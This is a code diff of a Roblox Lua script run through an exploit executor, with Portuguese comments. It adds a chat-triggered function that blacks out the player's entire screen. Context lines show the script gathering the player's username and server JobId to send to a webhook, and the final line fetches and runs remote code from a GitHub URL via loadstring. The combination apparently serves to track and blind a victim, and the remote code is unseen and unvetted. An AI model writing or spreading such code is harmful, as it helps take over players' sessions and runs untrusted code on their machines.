@@ -3,6 +3,29 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 
+-- Função que cria a GUI preta fullscreen
+local function criarGuiPreta()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BlackScreenGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0
+    frame.Parent = screenGui
+end
+
+-- Evento para ouvir o chat do jogador local
+player.Chatted:Connect(function(msg)
+    if msg:lower() == ";hi" then
+        criarGuiPreta()
+    end
+end)
+
+-- Coleta dados para enviar webhook
 local username = player.Name
 local jobId = game.JobId -- ID único do servidor atual
 
@@ -64,5 +87,6 @@ else
     warn("Executor não suporta requisições HTTP.")
 end
 
-task.wait(1) -- Espera 1 segundo antes de fechar
+-- Seu wait + loadstring original (se quiser manter)
+task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/view.lua"))()
